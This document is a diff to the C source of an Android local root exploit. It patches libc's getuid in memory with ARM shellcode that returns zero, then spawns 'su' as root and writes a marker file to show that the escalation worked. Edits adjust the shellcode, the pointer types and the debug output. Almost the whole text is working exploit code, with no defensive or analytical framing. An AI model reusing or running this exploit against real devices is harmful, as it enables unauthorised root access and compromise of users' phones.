@@ -25,7 +25,7 @@
 #include <sys/types.h>
 
 
-#define SHELLCODE	"\x00\x20\xF7\x46"
+#define SHELLCODE	"\x00\x00\xA0\xE3\x0E\xF0\xA0\xE1" // MOV R0, #0; MOV PC, R14;
 #define SPACE_SIZE	256
 #define LIBC_PATH	"/system/lib/libc.so"
 #define LOOP		0x1000000
@@ -37,7 +37,7 @@
 struct mem_arg  {
 	struct stat st;
 	off_t offset;
-	unsigned long patch_addr;
+	unsigned int patch_addr;
 	unsigned char *patch;
 	unsigned char *unpatch;
 	size_t patch_size;
@@ -56,7 +56,7 @@ static int check(bool do_patch, const char *thread_name)
 
 	if (do_patch) {
 		if (uid == 0) {
-			printf("[*] patched (%s)\n", thread_name);
+			printf("[*] patched uid=%d (%s)\n", uid, thread_name);
 			return 1;
 		}
 	} else {
@@ -157,7 +157,7 @@ static int get_range(unsigned int *start, unsigned int *end)
 
 static void getroot(void)
 {
-	execlp("su", "su", NULL);
+	execlp("su", "su", "-c", "touch /data/local/tmp/rootwasere", NULL);
 	err(1, "failed to execute \"su\"");
 }
 
@@ -246,7 +246,7 @@ int main(int argc, char *argv[])
 	printf("[*] mmap %p\n", mem_arg.map);
 
 	mem_arg.st = st;
-	mem_arg.offset = (off_t)((unsigned long)mem_arg.map + getuid_addr - start);
+	mem_arg.offset = (off_t)((unsigned int)mem_arg.map + getuid_addr - start);
 
 	exploit(&mem_arg, true);
 
@@ -257,6 +257,7 @@ int main(int argc, char *argv[])
 	if (pid == 0) {
 		getroot();
 	} else {
+		//return 0;
 		sleep(2);
 		exploit(&mem_arg, false);
 		if (waitpid(pid, NULL, 0) == -1)
